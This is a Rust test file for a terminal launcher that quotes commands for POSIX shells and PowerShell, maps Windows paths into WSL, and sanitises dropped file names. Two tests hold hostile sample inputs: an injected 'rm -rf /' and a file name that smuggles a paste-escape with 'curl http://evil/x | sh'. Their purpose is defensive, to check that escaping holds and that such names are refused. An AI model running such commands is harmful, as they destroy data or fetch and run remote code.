use super::*;

fn launch<'a>(program: &'a str, args: &'a [String]) -> Launch<'a> {
    Launch {
        backend: Backend::Native,
        distro: None,
        cwd: "/home/ada/code",
        program,
        args,
        via_shell: true,
    }
}

#[test]
fn wraps_every_argument_in_single_quotes() {
    assert_eq!(
        posix_command_line("claude", &["--continue".into()]),
        "'claude' '--continue'"
    );
}

#[test]
fn keeps_a_spaced_argument_as_one_word() {
    let line = posix_command_line("claude", &["-p".into(), "what changed?".into()]);
    assert_eq!(line, "'claude' '-p' 'what changed?'");
}

#[test]
fn escapes_embedded_quotes_so_the_shell_cannot_break_out() {
    assert_eq!(posix_quote("it's"), r"'it'\''s'");
    assert_eq!(posix_quote("'; rm -rf /"), r"''\''; rm -rf /'");
}

#[test]
fn a_program_with_no_arguments_is_still_quoted() {
    assert_eq!(
        posix_command_line("/opt/my tools/claude", &[]),
        "'/opt/my tools/claude'"
    );
}

#[test]
fn powershell_doubles_an_embedded_quote_rather_than_backslashing_it() {
    assert_eq!(powershell_quote("it's"), "'it''s'");
    assert_eq!(
        powershell_command_line("claude", &["-p".into(), "what's new?".into()]),
        "'claude' '-p' 'what''s new?'"
    );
}

#[test]
fn a_posix_shell_session_with_no_program_is_an_interactive_login_shell() {
    assert_eq!(posix_shell_args("", &[]), ["-l"]);
    assert_eq!(powershell_args("", &[]), ["-NoLogo"]);
}

#[test]
fn a_program_replaces_the_shell_rather_than_nesting_under_it() {
    let args = posix_shell_args("claude", &["--continue".into()]);
    assert_eq!(args, ["-l", "-i", "-c", "exec 'claude' '--continue'"]);

    let args = powershell_args("claude", &["--continue".into()]);
    assert_eq!(args, ["-NoLogo", "-Command", "& 'claude' '--continue'"]);
}

#[test]
fn skipping_the_shell_runs_the_program_itself() {
    let args = ["--continue".to_string()];
    let direct = Launch {
        via_shell: false,
        ..launch("claude", &args)
    };
    let resolved = argv(&direct);
    assert_eq!(resolved.program, "claude");
    assert_eq!(resolved.args, args);
}

#[test]
fn an_interactive_session_keeps_the_shell_even_when_the_shell_is_skipped() {
    let no_args: [String; 0] = [];
    let resolved = argv(&Launch {
        via_shell: false,
        ..launch("", &no_args)
    });
    assert_ne!(resolved.program, "");
    assert!(!resolved.args.is_empty());
}

#[test]
fn a_wsl_session_enters_the_distro_at_the_sessions_own_directory() {
    let no_args: [String; 0] = [];
    let args = wsl_args(&Launch {
        backend: Backend::Wsl,
        distro: Some("Ubuntu"),
        cwd: r"C:\Users\ada\code",
        ..launch("", &no_args)
    });
    assert_eq!(args, ["-d", "Ubuntu", "--cd", "/mnt/c/Users/ada/code"]);
}

#[test]
fn a_wsl_session_with_no_distro_uses_the_default_one() {
    let no_args: [String; 0] = [];
    let args = wsl_args(&Launch {
        backend: Backend::Wsl,
        distro: None,
        cwd: "/home/ada",
        ..launch("", &no_args)
    });
    assert_eq!(args, ["--cd", "/home/ada"]);
}

#[test]
fn a_wsl_agent_runs_through_the_distros_login_shell() {
    let extra = ["--continue".to_string()];
    let args = wsl_args(&Launch {
        backend: Backend::Wsl,
        distro: Some("Ubuntu"),
        cwd: r"\\wsl$\Ubuntu\home\ada\code",
        ..launch("claude", &extra)
    });
    assert_eq!(
        args,
        [
            "-d",
            "Ubuntu",
            "--cd",
            "/home/ada/code",
            "--",
            "bash",
            // `-i` for the same reason the host shell needs it: `.bashrc`
            // is where a distro's PATH edits live.
            "-lic",
            "exec 'claude' '--continue'",
        ]
    );
}

#[test]
fn a_wsl_request_off_windows_falls_back_to_the_host_shell() {
    let no_args: [String; 0] = [];
    let resolved = argv(&Launch {
        backend: Backend::Wsl,
        ..launch("", &no_args)
    });
    if cfg!(windows) {
        assert_eq!(resolved.program, "wsl.exe");
    } else {
        assert_ne!(resolved.program, "wsl.exe");
    }
}

#[test]
fn translates_a_drive_letter_to_its_wsl_mount() {
    assert_eq!(wsl_path(r"C:\Users\ada\code"), "/mnt/c/Users/ada/code");
    assert_eq!(wsl_path("D:/data"), "/mnt/d/data");
    assert_eq!(wsl_path(r"C:\"), "/mnt/c");
    assert_eq!(wsl_path("C:"), "/mnt/c");
}

#[test]
fn unwraps_the_share_windows_reaches_a_distro_through() {
    assert_eq!(wsl_path(r"\\wsl$\Ubuntu\home\ada\code"), "/home/ada/code");
    assert_eq!(wsl_path(r"\\wsl.localhost\Debian\srv\app"), "/srv/app");
    assert_eq!(wsl_path(r"\\wsl$\Ubuntu"), "/");
}

#[test]
fn a_path_the_distro_already_understands_is_left_alone() {
    assert_eq!(wsl_path("/home/ada/code"), "/home/ada/code");
    assert_eq!(wsl_path("/"), "/");
}

#[test]
fn reads_the_distro_list_out_of_utf16_output() {
    let out: Vec<u8> = "\u{feff}Ubuntu\r\nDebian\r\n"
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect();
    assert_eq!(parse_wsl_distros(&out), ["Ubuntu", "Debian"]);
}

#[test]
fn a_distro_list_that_is_plain_utf8_still_parses() {
    assert_eq!(parse_wsl_distros(b"Ubuntu\nDebian\n"), ["Ubuntu", "Debian"]);
    assert!(parse_wsl_distros(b"").is_empty());
}

#[test]
fn the_default_shell_is_an_absolute_path_or_a_windows_executable() {
    let shell = default_shell();
    assert!(shell.starts_with('/') || shell.ends_with(".exe"), "{shell}");
}

#[test]
fn home_is_readable_on_every_host() {
    assert!(home().is_some_and(|home| !home.is_empty()));
}

#[cfg(unix)]
#[test]
fn reads_this_process_own_directory() {
    let cwd = process_cwd(std::process::id() as i32);
    assert_eq!(cwd.as_deref(), Some(env!("CARGO_MANIFEST_DIR")));
}

#[cfg(target_os = "macos")]
#[test]
fn reads_the_cwd_field_out_of_lsof_output() {
    let out = "p54321\nfcwd\nn/Users/ada/code/project\n";
    assert_eq!(
        parse_lsof_cwd(out).as_deref(),
        Some("/Users/ada/code/project")
    );
}

#[cfg(target_os = "macos")]
#[test]
fn ignores_lsof_output_with_no_path() {
    assert_eq!(parse_lsof_cwd("p54321\nfcwd\n"), None);
    assert_eq!(parse_lsof_cwd(""), None);
    // A permission error leaves a relative or bare marker, never a path.
    assert_eq!(parse_lsof_cwd("p1\nfcwd\nnno-such-thing"), None);
}

#[test]
fn a_dropped_path_is_quoted_for_the_shell_that_will_read_it() {
    let paths = vec!["/code/my app/notes.md".to_string()];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, false),
        "'/code/my app/notes.md' "
    );
    assert_eq!(
        drop_text(&paths, Quoting::Powershell, false),
        "'/code/my app/notes.md' "
    );
}

#[test]
fn a_quote_in_a_filename_cannot_end_the_quoting() {
    // A file really can be called this, and the two shells escape it
    // differently — POSIX by closing and reopening, PowerShell by doubling.
    let paths = vec!["/tmp/it's here.txt".to_string()];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, false),
        r"'/tmp/it'\''s here.txt' "
    );
    assert_eq!(
        drop_text(&paths, Quoting::Powershell, false),
        "'/tmp/it''s here.txt' "
    );
}

#[test]
fn several_dropped_files_arrive_as_several_arguments() {
    let paths = vec!["/a.txt".to_string(), "/b.txt".to_string()];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, false),
        "'/a.txt' '/b.txt' "
    );
}

#[test]
fn a_drop_on_a_wsl_session_gets_the_path_the_distro_can_open() {
    // `C:\code\a.txt` names nothing inside the distro.
    let paths = vec!["C:\\code\\a.txt".to_string()];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, true),
        "'/mnt/c/code/a.txt' "
    );
}

#[test]
fn a_drop_of_nothing_types_nothing() {
    // The event fires with an empty list when a drag is cancelled over the
    // window, and a bare space would still be a keystroke the agent sees.
    assert_eq!(drop_text(&[], Quoting::Posix, false), "");
    assert_eq!(drop_text(&[String::new()], Quoting::Posix, false), "");
}

#[test]
fn a_filename_carrying_control_bytes_is_never_typed() {
    // Quoting keeps its balance, but the text is delivered through bracketed
    // paste, which does not strip an end marker embedded in it — so the
    // receiving program would leave paste mode and read the rest as keys.
    let hostile = "/repo/x\u{1b}[201~; curl http://evil/x | sh\r".to_string();

    let paths = [hostile];
    assert_eq!(drop_text(&paths, Quoting::Posix, false), "");
    assert_eq!(drop_text(&paths, Quoting::Powershell, false), "");
}

#[test]
fn a_newline_in_a_filename_is_refused_too() {
    // xterm turns a newline into a carriage return, which submits the line.
    assert_eq!(
        drop_text(&["/repo/two\nlines.txt".to_string()], Quoting::Posix, false),
        ""
    );
}

#[test]
fn refusing_one_path_still_drops_the_others() {
    let paths = vec![
        "/repo/fine.txt".to_string(),
        "/repo/bad\u{1b}.txt".to_string(),
        "/repo/also fine.txt".to_string(),
    ];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, false),
        "'/repo/fine.txt' '/repo/also fine.txt' "
    );
}
